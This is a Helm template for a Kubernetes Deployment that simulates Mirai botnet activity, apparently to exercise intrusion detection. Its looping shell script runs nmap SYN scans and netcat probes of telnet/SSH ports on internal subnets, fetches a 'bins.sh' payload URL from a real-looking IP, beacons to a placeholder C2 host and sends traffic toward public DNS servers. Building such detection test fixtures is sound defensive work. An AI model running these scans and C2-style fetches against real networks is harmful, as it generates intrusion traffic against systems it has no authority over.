# Mirai Simulation Deployment
{{- if .Values.mirai.enabled }}
apiVersion: apps/v1
kind: Deployment
metadata:
  name: {{ include "malicious-containers.fullname" . }}-mirai
  labels:
    {{- include "malicious-containers.labels" . | nindent 4 }}
    app.kubernetes.io/component: mirai
    kids-label: "1"
spec:
  replicas: 1
  selector:
    matchLabels:
      {{- include "malicious-containers.selectorLabels" . | nindent 6 }}
      app.kubernetes.io/component: mirai
  template:
    metadata:
      labels:
        {{- include "malicious-containers.selectorLabels" . | nindent 8 }}
        app.kubernetes.io/component: mirai
        kids-label: "1"
    spec:
      {{- with .Values.nodeSelector }}
      nodeSelector:
        {{- toYaml . | nindent 8 }}
      {{- end }}
      {{- with .Values.tolerations }}
      tolerations:
        {{- toYaml . | nindent 8 }}
      {{- end }}
      containers:
        - name: mirai
          image: {{ .Values.mirai.image }}
          {{- if .Values.mirai.commandOverride }} # add commandOveride
          command: ["/bin/sh", "-c"]
          args:
            - |
              apk add --no-cache iputils nmap nmap-nping curl wget busybox-extras
              echo "Starting Mirai botnet simulation..."
              while true; do
                # Phase 1: Quick port scanning (reduced subnet for speed)
                echo "[$(date)] Scanning for vulnerable devices..."
                nmap -sS -p 23,22,80,8080 10.42.0.0/28 2>/dev/null || true
                nmap -sS -p 23,22,80,8080 10.0.1.0/28 2>/dev/null || true

                # Phase 2: Telnet/SSH brute-force attempts
                echo "[$(date)] Attempting telnet/SSH connections..."
                for i in $(seq 1 20); do
                  nc -zv -w 1 10.0.0.$i 23 2>&1 || true
                  nc -zv -w 1 10.0.0.$i 22 2>&1 || true
                  nc -zv -w 1 10.42.0.$i 23 2>&1 || true
                done

                # Phase 3: C2 communication (command and control)
                echo "[$(date)] Communicating with C2 server..."
                wget -q -O /dev/null http://185.244.25.0/bins.sh 2>&1 || true
                curl -s http://cnc.mirai.botnet.invalid/report 2>&1 || true
                nslookup report.mirai.botnet.invalid 2>/dev/null || true

                # Phase 4: DDoS simulation
                echo "[$(date)] Simulating flood activity..."
                for i in $(seq 1 10); do
                  nc -zv -w 1 8.8.8.8 80 2>&1 || true
                  nc -zv -w 1 8.8.4.4 443 2>&1 || true
                done

                echo "[$(date)] Cycle complete. Sleeping {{ .Values.mirai.interval }}s..."
                sleep {{ .Values.mirai.interval }}
              done
          {{- end }}
{{- end }}
